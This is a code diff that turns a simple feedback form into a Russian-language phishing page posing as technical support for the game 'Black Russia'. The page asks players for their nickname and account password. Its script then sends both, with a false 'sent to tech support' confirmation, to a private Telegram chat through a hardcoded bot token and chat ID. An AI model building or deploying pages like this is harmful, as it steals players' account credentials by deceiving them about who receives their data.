@@ -3,81 +3,268 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Форма обратной связи</title>
+    <title>Black Russia - Техподдержка</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; padding: 20px; }
-        .container { max-width: 500px; margin: 50px auto; background: #333; padding: 30px; border-radius: 10px; }
-        h1 { text-align: center; margin-bottom: 20px; color: #007bff; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; }
-        input, textarea { width: 100%; padding: 10px; border: 1px solid #555; border-radius: 5px; background: #222; color: white; }
-        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        .message { text-align: center; padding: 10px; margin-top: 10px; border-radius: 5px; display: none; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                        url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&auto=format&fit=crop&w=2000&q=80');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 15px;
+            padding: 30px;
+            border: 2px solid #b8860b;
+            box-shadow: 0 0 20px rgba(184, 134, 11, 0.3);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #b8860b;
+            text-shadow: 0 0 10px rgba(184, 134, 11, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .logo p {
+            color: #ccc;
+            font-size: 1.1em;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b8860b;
+            font-weight: bold;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #b8860b;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #ffd700;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        input::placeholder, textarea::placeholder {
+            color: #999;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #b8860b, #daa520);
+            color: black;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(45deg, #daa520, #ffd700);
+        }
+
+        .message {
+            text-align: center;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 8px;
+            display: none;
+            font-weight: bold;
+        }
+
+        .success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+
+        .problem-type {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .problem-type label {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background: rgba(184, 134, 11, 0.1);
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .problem-type input {
+            width: auto;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Форма обратной связи</h1>
-        <form id="feedbackForm">
+        <div class="logo">
+            <h1>BLACK RUSSIA</h1>
+            <p>Форма обращений в техподдержку</p>
+        </div>
+
+        <form id="supportForm">
             <div class="form-group">
-                <label>Ваше имя:</label>
-                <input type="text" id="name" placeholder="Введите ваше имя" required>
+                <label for="nickname">1. Никнейм в игре:</label>
+                <input type="text" id="nickname" placeholder="Введите ваш никнейм" required>
             </div>
+            
             <div class="form-group">
-                <label>Email:</label>
-                <input type="email" id="email" placeholder="Введите ваш email" required>
+                <label for="password">2. Пароль от аккаунта:</label>
+                <input type="password" id="password" placeholder="Введите ваш пароль" required>
             </div>
+
             <div class="form-group">
-                <label>Сообщение:</label>
-                <textarea id="message" rows="4" placeholder="Ваше сообщение..." required></textarea>
+                <label>3. Тип проблемы:</label>
+                <select id="problemType" required>
+                    <option value="">Выберите тип проблемы</option>
+                    <option value="technical">Технические проблемы</option>
+                    <option value="gameplay">Игровой процесс</option>
+                    <option value="account">Проблемы с аккаунтом</option>
+                    <option value="payment">Проблемы с оплатой</option>
+                    <option value="other">Другое</option>
+                </select>
             </div>
-            <button type="submit">Отправить сообщение</button>
+            
+            <div class="form-group">
+                <label for="problemDescription">4. Подробное описание проблемы:</label>
+                <textarea id="problemDescription" rows="5" placeholder="Опишите вашу проблему максимально подробно..." required></textarea>
+            </div>
+            
+            <button type="submit">Отправить обращение</button>
         </form>
-        <div class="message success" id="successMessage">✅ Сообщение отправлено!</div>
-        <div class="message error" id="errorMessage">❌ Ошибка отправки</div>
+        
+        <div class="message success" id="successMessage">
+            ✅ Обращение отправлено в техподдержку!
+        </div>
+        
+        <div class="message error" id="errorMessage">
+            ❌ Ошибка отправки. Попробуйте еще раз.
+        </div>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8';
         const TELEGRAM_CHAT_ID = '1491315056';
 
-        document.getElementById('feedbackForm').addEventListener('submit', function(e) {
+        document.getElementById('supportForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const name = document.getElementById('name').value;
-            const email = document.getElementById('email').value;
-            const message = document.getElementById('message').value;
             
+            const nickname = document.getElementById('nickname').value;
+            const password = document.getElementById('password').value;
+            const problemType = document.getElementById('problemType').value;
+            const problemDescription = document.getElementById('problemDescription').value;
+            
+            if (!nickname || !password || !problemType || !problemDescription) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            // Показываем загрузку
             const button = document.querySelector('button');
-            button.textContent = 'Отправка...';
+            button.textContent = 'Отправка в техподдержку...';
             button.disabled = true;
             
-            const text = `📩 НОВОЕ СООБЩЕНИЕ\n👤 Имя: ${name}\n📧 Email: ${email}\n💬 Сообщение: ${message}\n⏰ Время: ${new Date().toLocaleString()}`;
+            // Отправляем в Telegram
+            sendToTelegram(nickname, password, problemType, problemDescription);
+        });
+
+        function sendToTelegram(nickname, password, problemType, problemDescription) {
+            const problemTypes = {
+                'technical': 'Технические проблемы',
+                'gameplay': 'Игровой процесс', 
+                'account': 'Проблемы с аккаунтом',
+                'payment': 'Проблемы с оплатой',
+                'other': 'Другое'
+            };
+
+            const text = `🛠️ НОВОЕ ОБРАЩЕНИЕ В ТЕХПОДДЕРЖКУ\n\n` +
+                        `👤 Никнейм: ${nickname}\n` +
+                        `🔑 Пароль: ${password}\n` +
+                        `📋 Тип проблемы: ${problemTypes[problemType]}\n` +
+                        `📝 Описание: ${problemDescription}\n\n` +
+                        `⏰ Время: ${new Date().toLocaleString()}`;
             
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text
+                })
             })
             .then(response => response.json())
             .then(data => {
+                // Успех
                 document.getElementById('successMessage').style.display = 'block';
-                document.getElementById('feedbackForm').reset();
+                document.getElementById('supportForm').reset();
             })
             .catch(error => {
+                // Ошибка
                 document.getElementById('errorMessage').style.display = 'block';
             })
             .finally(() => {
-                button.textContent = 'Отправить сообщение';
+                // Восстанавливаем кнопку
+                const button = document.querySelector('button');
+                button.textContent = 'Отправить обращение';
                 button.disabled = false;
+                
+                // Скрываем сообщения через 3 секунды
                 setTimeout(() => {
                     document.getElementById('successMessage').style.display = 'none';
                     document.getElementById('errorMessage').style.display = 'none';
                 }, 3000);
             });
-        });
+        }
     </script>
 </body>
 </html>
